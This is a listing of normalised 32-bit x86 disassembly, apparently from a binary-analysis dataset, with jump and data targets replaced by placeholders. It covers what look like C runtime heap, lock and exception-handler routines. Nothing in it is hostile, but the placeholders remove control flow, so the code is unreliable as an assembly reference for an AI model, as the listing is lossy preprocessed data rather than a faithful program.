cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_200368f
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_2005753
push 0xc
push r--data
call sub_2006310
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_2009b1c
push 0x1e
call sub_2009971
push 0xff
call sub_2005225
push 0x18
call sub_200ba1e
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_2005621
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_2006355
retn
push edi
call sub_200368f
pop ecx
push 0xfa0
push edi
call sub_200b9b6
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_200368f
pop ecx
call sub_2005621
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200580d
mov eax [ ebp - 0x1c ]
sub_2005816
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_2005753
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_20051d1
pop ecx
sub_2005849
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_2005879
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_200bb00
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_2005b8f
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_2005c3f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_2005d47
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_2006028
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_2005c3f
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_2005b8f
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_2006310
push sub_2006370
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_2006370
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2003680
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2003680
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_2006d4c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_2006d02
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_2003680
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2003680
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_2006d32
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_2006d4c
mov eax [ ebp + 0xc ]
push rw-data
call sub_200b670
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_2003680
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_2006d19
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_2003680
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_2006502
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_200ba63
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_200ba63
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
